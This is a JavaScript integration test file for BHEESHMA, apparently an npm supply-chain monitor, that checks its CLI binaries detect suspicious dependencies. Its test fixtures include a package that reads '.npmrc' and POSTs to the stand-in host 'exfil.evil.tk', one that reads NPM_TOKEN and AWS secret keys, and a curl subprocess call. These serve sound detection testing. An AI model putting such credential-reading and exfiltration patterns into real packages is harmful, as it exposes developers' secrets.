/**
 * BHEESHMA CLI Integration Tests
 *
 * These drive the ACTUAL binaries (bin/bheeshma.js, bin/bheeshma-ci.js) the way
 * a user / CI pipeline does — by spawning them — instead of calling the
 * in-process API. That distinction matters: every serious bug found while
 * hardening this project (CI collecting zero signals, --fail-level being a
 * no-op, the install monitor seeing nothing) lived in the binaries and was
 * invisible to the in-process harness. These tests close that gap.
 *
 * Fully offline and deterministic: the monitored commands are `node <script>`
 * requiring local fixture packages. No npm, no network.
 */

'use strict';

const assert = require('assert');
const { spawnSync } = require('child_process');
const fs = require('fs');
const os = require('os');
const path = require('path');

const results = { passed: 0, failed: 0 };
function check(condition, message) {
    if (condition) {
        console.log(`  ✓ ${message}`);
        results.passed++;
    } else {
        console.error(`  ✗ ${message}`);
        results.failed++;
    }
}

const BIN_CI = path.resolve(__dirname, '../bin/bheeshma-ci.js');
const BIN_MAIN = path.resolve(__dirname, '../bin/bheeshma.js');

let work;

function setup() {
    work = fs.mkdtempSync(path.join(os.tmpdir(), 'bheeshma-cli-'));
    const nm = path.join(work, 'node_modules');

    const mkpkg = (name, indexSrc) => {
        const dir = path.join(nm, name);
        fs.mkdirSync(dir, { recursive: true });
        fs.writeFileSync(path.join(dir, 'package.json'),
            JSON.stringify({ name, version: '1.0.0', main: 'index.js' }));
        fs.writeFileSync(path.join(dir, 'index.js'), indexSrc);
    };

    // CRITICAL: reads a credential file AND exfiltrates over HTTPS.
    mkpkg('exfilpkg', `
        const fs = require('fs');
        const https = require('https');
        try { fs.readFileSync('.npmrc', 'utf8'); } catch (e) {}
        try { const r = https.request({ host: 'exfil.evil.tk', port: 443, path: '/s', method: 'POST' }); r.on('error', () => {}); r.destroy(); } catch (e) {}
        module.exports = {};
    `);

    // HIGH: reads secret env vars (no CRITICAL pattern).
    mkpkg('highpkg', `
        const t = process.env.NPM_TOKEN; const a = process.env.AWS_SECRET_ACCESS_KEY;
        module.exports = {};
    `);

    // LOW: no observable side effects.
    mkpkg('benignpkg', `module.exports = { add: (a, b) => a + b };`);

    fs.writeFileSync(path.join(work, 'app-exfil.js'), `require('exfilpkg');`);
    fs.writeFileSync(path.join(work, 'app-high.js'), `require('highpkg');`);
    fs.writeFileSync(path.join(work, 'app-benign.js'), `require('benignpkg');`);
}

function cleanup() {
    if (work) { try { fs.rmSync(work, { recursive: true, force: true }); } catch (e) {} }
}

function runCi(args) {
    return spawnSync(process.execPath, [BIN_CI, ...args], { cwd: work, encoding: 'utf8' });
}
function runMain(args) {
    return spawnSync(process.execPath, [BIN_MAIN, ...args], { cwd: work, encoding: 'utf8' });
}

function run() {
    console.log('='.repeat(70));
    console.log('BHEESHMA CLI Integration Tests');
    console.log('='.repeat(70));
    setup();

    // --- bheeshma-ci: spawn-path signal collection + enforcement ---
    console.log('\nbheeshma-ci — signal collection from spawned command');
    const sarif1 = path.join(work, 'out1.sarif');
    const r1 = runCi(['--fail-level', 'critical', '--output', sarif1, '--', 'node', 'app-exfil.js']);
    check(/Ingested\s+[1-9]/.test(r1.stderr) || /Monitored\s+[1-9]/.test(r1.stderr),
        'collects signals from the spawned command (not "0 signals")');
    check(r1.status === 1, 'exits 1 on a CRITICAL package at fail-level critical');
    check(/exfilpkg/.test(r1.stderr), 'names the offending package (exfilpkg)');
    check(fs.existsSync(sarif1), 'writes the SARIF output file');
    if (fs.existsSync(sarif1)) {
        let sarif;
        try { sarif = JSON.parse(fs.readFileSync(sarif1, 'utf8')); } catch (e) { sarif = null; }
        check(sarif && sarif.version === '2.1.0' && Array.isArray(sarif.runs),
            'SARIF output is valid v2.1.0');
    }

    // --- fail-level wiring through the real binary ---
    console.log('\nbheeshma-ci — fail-level is honored end-to-end');
    const r2 = runCi(['--fail-level', 'critical', '--output', path.join(work, 'o2.sarif'), '--', 'node', 'app-high.js']);
    check(r2.status === 0, 'fail-level critical PASSES a HIGH-only package (exit 0)');
    const r3 = runCi(['--fail-level', 'high', '--output', path.join(work, 'o3.sarif'), '--', 'node', 'app-high.js']);
    check(r3.status === 1, 'fail-level high FAILS the same HIGH package (exit 1) — not a no-op');
    check(/highpkg/.test(r3.stderr) && /HIGH/.test(r3.stderr), 'reports the HIGH package');

    const r4 = runCi(['--fail-level', 'critical', '--output', path.join(work, 'o4.sarif'), '--', 'node', 'app-benign.js']);
    check(r4.status === 0, 'a benign package passes (exit 0)');

    // --- main bheeshma CLI: spawn path + JSON + enforce ---
    console.log('\nbheeshma — spawn path collects and enforces');
    const jsonOut = path.join(work, 'report.json');
    const r5 = runMain(['--enforce', '--format', 'json', '--output', jsonOut, '--', 'node', 'app-exfil.js']);
    check(r5.status === 1, '--enforce exits 1 on a CRITICAL package via the spawn path');
    if (fs.existsSync(jsonOut)) {
        let rep; try { rep = JSON.parse(fs.readFileSync(jsonOut, 'utf8')); } catch (e) { rep = null; }
        const names = rep && Array.isArray(rep.packages) ? rep.packages.map(p => p.name) : [];
        check(names.includes('exfilpkg'), 'JSON report from the spawn path contains the offending package');
    } else {
        check(false, 'JSON report file was written');
    }

    // --- package-manager detection (the PM-skip that keeps install reports clean) ---
    console.log('\nprocessKind — package-manager detection');
    const { isPackageManagerEntry } = require('../src/util/processKind');
    check(isPackageManagerEntry('/usr/local/bin/npm') === true, 'detects /usr/local/bin/npm');
    check(isPackageManagerEntry('/x/lib/node_modules/npm/bin/npm-cli.js') === true, 'detects npm-cli.js');
    check(isPackageManagerEntry('/usr/bin/yarn') === true, 'detects yarn launcher');
    check(isPackageManagerEntry('/app/node_modules/evilpkg/index.js') === false, 'does NOT flag a dependency entry');
    check(isPackageManagerEntry('/app/server.js') === false, 'does NOT flag ordinary app code');

    // --- out-of-process engine: catches native subprocess egress (skipped w/o strace) ---
    console.log('\nbheeshma-sandbox — out-of-process engine (Linux + strace)');
    const hasStrace = spawnSync('which', ['strace'], { encoding: 'utf8' }).status === 0;
    if (!hasStrace) {
        console.log('  (skipped: strace not available on this platform)');
    } else {
        const sbxPkg = path.join(work, 'node_modules', 'nativeexfil');
        fs.mkdirSync(sbxPkg, { recursive: true });
        fs.writeFileSync(path.join(sbxPkg, 'package.json'), JSON.stringify({ name: 'nativeexfil', version: '1.0.0' }));
        // Payload shells out to curl — native egress the in-process engine cannot see.
        // Target a closed local port so the test stays offline and fast.
        fs.writeFileSync(path.join(sbxPkg, 'payload.js'),
            `try{require('child_process').execSync('curl -s --max-time 2 http://127.0.0.1:9/ >/dev/null 2>&1 || true')}catch(e){}`);
        const SANDBOX_BIN = path.resolve(__dirname, '../bin/bheeshma-sandbox.js');
        const rs = spawnSync(process.execPath,
            [SANDBOX_BIN, '--', 'node', path.join(sbxPkg, 'payload.js')],
            { cwd: work, encoding: 'utf8' });
        const out = (rs.stdout || '') + (rs.stderr || '');
        check(/nativeexfil/.test(out), 'attributes native-subprocess behavior to the package (process lineage)');
        check(/NET.?CONNECT|NETWORK/i.test(out), 'captures native subprocess egress (curl) that the in-process engine misses');
    }

    // --- types drift guard: index.d.ts must declare exactly the runtime API ---
    console.log('\nindex.d.ts — declared API matches runtime exports');
    const api = require('../src/index');
    const runtimeExports = Object.keys(api).sort();
    const dts = fs.readFileSync(path.resolve(__dirname, '../src/index.d.ts'), 'utf8');
    const declared = [...new Set(
        [...dts.matchAll(/export function ([a-zA-Z0-9_]+)\s*[<(]/g)].map(m => m[1])
    )].sort();
    const missing = runtimeExports.filter(n => !declared.includes(n));
    const extra = declared.filter(n => !runtimeExports.includes(n));
    check(missing.length === 0, `every runtime export is declared in index.d.ts${missing.length ? ' (missing: ' + missing.join(', ') + ')' : ''}`);
    check(extra.length === 0, `index.d.ts declares no phantom exports${extra.length ? ' (extra: ' + extra.join(', ') + ')' : ''}`);

    cleanup();

    console.log('\n' + '='.repeat(70));
    console.log(`CLI integration: ${results.passed} passed, ${results.failed} failed`);
    console.log('='.repeat(70));
    if (results.failed > 0) process.exit(1);
}

try {
    run();
} catch (err) {
    cleanup();
    console.error('CLI integration test harness error:', err);
    process.exit(1);
}
